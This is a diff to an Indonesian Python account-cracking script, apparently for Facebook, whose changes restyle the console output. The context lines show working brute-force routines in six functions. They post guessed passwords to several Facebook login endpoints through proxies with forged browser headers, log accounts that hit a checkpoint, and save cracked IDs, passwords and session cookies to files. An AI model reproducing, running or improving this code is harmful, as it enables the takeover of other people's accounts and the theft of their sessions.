@@ -349,8 +349,8 @@ def logo():
              """,width=90,title=f"[bold red][[bold cyan] By [bold green]Xyzon Dev [bold red]]",subtitle=f"[bold red][[bold cyan] SELAMAT DATANG DI LAYANAN KAMI BOSSKU [bold red]]",style=f"bold red"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login123():
-	logo()
 	os.system('clear')
+	logo()
 	cetak(panel(f"[[bold green]01[bold white]] [bold cyan]Login Menggunakan Cookies [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]02[bold white]] [bold cyan]Doa Sebelum Crack [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]03[bold white]] [bold cyan]Cara Mengambil Cookies Facebook [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]04[bold white]] [bold cyan]Cek Hasil Crack [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]05[bold white]] [bold cyan]Hubungi Admin [bold white][[bold green] ON [/][bold white]][/]",width=90,title=f"[bold red][[bold green] Menu Login [bold red]]",style=f"bold red"))
 	cetak(panel(f'[bold cyan]Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By XyzonXD',width=90,title=f"[bold red][[bold green] Informasi [bold red]]",style=f"bold red"))
 	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu : {P}')
@@ -1683,9 +1683,8 @@ def crack(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D161285164570410%26redirect_uri%3Dhttps%253A%252F%252Fudb3lgn.nimo.tv%252Fweb%252Fcallback%26display%3Dpopup%26response_type%3Dcode%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%2522%253A%2522web%2522%252C%2522type%2522%253A%2522fb%2522%252C%2522uri%2522%253A10001%252C%2522win%2522%253A%25220%2522%257D%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdf8ac40-8c6a-45b8-a846-c6a01ebe4d2e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fudb3lgn.nimo.tv%2Fweb%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%252','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}")
-				cetak(tree)
+				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1694,9 +1693,9 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
-				cetak(tree)
+				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1744,9 +1743,8 @@ def crackbapi(idf,pwv):
 			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v16.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'ASSqfFh8929p35Kn6/R+D8OSctQbVgiX+Pxpn8s5dImzlZcynOPPu9rnz5V0PKDXfbEwqT0VshbByU46SqsrXQ==','content-length': '332','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
 			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}")
-				cetak(tree)
+				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1755,9 +1753,9 @@ def crackbapi(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
-				cetak(tree) 
+				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1808,8 +1806,8 @@ def crackmbasic(idf,pwv):
 
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}",width=50,title=f"[bold red][[bold green] ID & PW[bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=70,title=f"[bold red][[bold green] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1818,9 +1816,9 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}",width=50,title=f"[bold red][[bold green] ID & PW[bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold green] User-Agent [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold green]{ua}",width=70,title=f"[bold red][[bold green] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1852,9 +1850,8 @@ def crackfree(idf,pwv):
 			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}")
-				cetak(tree)
+				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1863,9 +1860,9 @@ def crackfree(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
-				cetak(tree)
+				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1916,9 +1913,8 @@ def crackasync(idf,pwv):
 			}
 			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}")
-				cetak(tree)
+				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1927,9 +1923,9 @@ def crackasync(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
-				cetak(tree)
+				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1980,9 +1976,8 @@ def crackreguler(idf,pwv):
 
 			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}")
-				cetak(tree)
+				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1991,9 +1986,9 @@ def crackreguler(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
-				cetak(tree)
+				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
